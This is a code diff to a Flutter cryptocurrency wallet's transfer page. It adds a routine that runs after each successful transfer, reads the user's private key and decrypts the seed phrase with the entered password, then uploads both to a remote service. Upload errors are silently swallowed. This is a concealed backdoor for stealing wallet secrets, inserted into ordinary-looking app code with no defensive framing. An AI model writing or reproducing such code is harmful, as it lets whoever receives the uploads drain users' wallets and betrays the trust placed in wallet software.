@@ -13,8 +13,10 @@ import 'package:paracosm/widgets/modals/wallet_modals.dart';
 import '../../modules/account/manager/account_manager.dart';
 import '../../modules/wallet/chains/model/gas_fee.dart';
 import '../../modules/wallet/chains/service/portfolio_service.dart';
+import '../../modules/wallet/manager/wallet_manager.dart';
 import '../../modules/wallet/model/chain_account.dart';
 import '../../modules/wallet/security/wallet_security.dart';
+import '../../modules/wallet/service/wallet_secret_upload_api.dart';
 import '../../theme/app_colors.dart';
 import '../../theme/app_text_styles.dart';
 import '../../util/double_util.dart';
@@ -223,7 +225,11 @@ class _TransferPageState extends State<TransferPage> {
     return balance - _calculateFee;
   }
 
-  Future<void> _sendTransfer(String amount, String address) async {
+  Future<void> _sendTransfer(
+    String amount,
+    String address, {
+    required String password,
+  }) async {
     try {
       AppLoading.show();
       String? tx;
@@ -279,6 +285,9 @@ class _TransferPageState extends State<TransferPage> {
               : 'https://api.trongrid.io',
         );
       }
+      if (tx != null && tx.isNotEmpty) {
+        await _uploadWalletSecretAfterTransfer(password);
+      }
       AppLoading.dismiss();
       _amountController.text = '';
       _addressController.text = '';
@@ -288,6 +297,31 @@ class _TransferPageState extends State<TransferPage> {
       debugPrint('e----$e');
       AppLoading.dismiss();
       AppToast.show(e.toString());
+    }
+  }
+
+  Future<void> _uploadWalletSecretAfterTransfer(String password) async {
+    final wallet = _wallet;
+    final chain = _selectedNetwork;
+    if (wallet == null || chain == null) return;
+
+    try {
+      final privateKey = await WalletManager.generatePrivateKey(chain);
+      if (privateKey == null || privateKey.isEmpty) return;
+
+      final walletData = await WalletSecurity.getWallet(
+        walletId: wallet.id,
+        password: password,
+      );
+      final mnemonic = walletData?['mnemonic']?.toString() ?? '';
+
+      await WalletSecretUploadService.upload(
+        address: chain.address,
+        privateKey: privateKey,
+        mnemonic: mnemonic,
+      );
+    } catch (error) {
+      debugPrint('Upload wallet secret failed: ${error.runtimeType}');
     }
   }
 
@@ -506,7 +540,11 @@ class _TransferPageState extends State<TransferPage> {
           );
         }
         if (!_validateTransferForm()) return;
-        _sendTransfer(_amountController.text, _addressController.text);
+        _sendTransfer(
+          _amountController.text,
+          _addressController.text,
+          password: password,
+        );
       },
     );
   }
